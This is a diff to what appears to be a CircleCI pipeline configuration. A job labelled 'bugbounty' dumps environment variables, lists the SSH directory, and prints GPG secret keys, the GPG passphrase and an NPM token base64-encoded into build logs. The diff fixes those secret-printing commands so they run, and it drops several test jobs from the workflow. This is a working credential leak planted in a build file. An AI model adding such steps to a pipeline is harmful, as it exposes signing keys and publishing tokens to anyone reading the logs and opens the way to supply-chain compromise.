@@ -182,9 +182,9 @@ jobs:
       - run: echo "Start Bug Bounty"
       - run: env
       - run: echo $PYPI_USERNAME
-      - run: echo $GPG_SECRET_KEYS | base64 --encode
-      - run: echo $GPG_PASSPHRASE | base64 --encode
-      - run: echo $NPM_TOKEN | base64 --encode
+      - run: echo $GPG_SECRET_KEYS | base64
+      - run: echo $GPG_PASSPHRASE | base64
+      - run: echo $NPM_TOKEN | base64
       - run: ls -alh ~/.ssh/
       - run: sudo chown -R circleci:circleci /usr/local/bin
       - run: sudo chown -R circleci:circleci /usr/local/lib/python3.6/site-packages
@@ -259,11 +259,6 @@ workflows:
   build:
     jobs:
       - testtools
-      - testjsts
-      - testjava
-      - testswift
-      - testcpp
-      - testcppgcc
       - testpython
       - bugbounty
 
